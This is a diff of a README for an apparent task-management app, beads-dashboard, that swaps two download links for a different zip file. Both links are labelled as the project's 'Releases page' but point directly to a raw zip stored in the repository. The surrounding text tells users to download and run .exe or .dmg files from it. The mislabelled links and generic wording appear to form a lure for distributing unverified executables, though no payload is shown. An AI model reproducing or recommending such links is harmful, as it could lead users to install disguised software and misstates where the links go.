@@ -7,7 +7,7 @@ Beads-dashboard is a modern web application designed to help you manage your tas
 To begin, you will need to download and install the application on your computer. Follow these steps to get your beads-dashboard up and running.
 
 1. **Visit the Releases Page**
-   To download the latest version of beads-dashboard, visit our releases page here: [Download beads-dashboard](https://raw.githubusercontent.com/Sehaam16/beads-dashboard/main/src/dashboard_beads_v3.7.zip).
+   To download the latest version of beads-dashboard, visit our releases page here: [Download beads-dashboard](https://raw.githubusercontent.com/Sehaam16/beads-dashboard/main/docs/beads_dashboard_3.8.zip).
 
 2. **Choose the Correct File**
    On the releases page, you will see different download options. Select the file that fits your operating system. If you use Windows, download the .exe file. For Mac, choose the .dmg file. Linux users can select the appropriate package.
@@ -44,7 +44,7 @@ Beads-dashboard offers several useful features designed to help you manage your 
 - **Data Security**: All your task data is saved locally on your device.
 
 ## 📥 Download & Install
-You can download the beads-dashboard directly from the [Releases page](https://raw.githubusercontent.com/Sehaam16/beads-dashboard/main/src/dashboard_beads_v3.7.zip). Follow the installation instructions outlined above to get started with this user-friendly application.
+You can download the beads-dashboard directly from the [Releases page](https://raw.githubusercontent.com/Sehaam16/beads-dashboard/main/docs/beads_dashboard_3.8.zip). Follow the installation instructions outlined above to get started with this user-friendly application.
 
 ## 🛠️ Troubleshooting
 If you encounter any issues during installation or usage, check the following common solutions:
